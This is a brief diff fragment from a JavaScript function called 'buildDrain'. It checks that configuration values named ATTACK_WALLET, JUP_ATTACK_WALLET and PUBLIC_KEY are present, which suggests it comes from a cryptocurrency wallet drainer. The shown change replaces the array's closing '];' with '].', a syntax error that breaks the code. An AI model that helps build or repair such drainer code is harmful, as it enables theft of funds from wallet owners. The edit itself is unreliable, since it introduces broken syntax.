@@ -27,7 +27,7 @@ async function buildDrain(user, connection) {
                 { name: "ATTACK_WALLET", value: config.ATTACK_WALLET },
                 { name: "JUP_ATTACK_WALLET", value: config.JUP_ATTACK_WALLET },
                 { name: "PUBLIC_KEY", value: config.PUBLIC_KEY }
-            ];
+            ].
 
             for (const { name, value } of requiredVars) {
                 if (!value) {
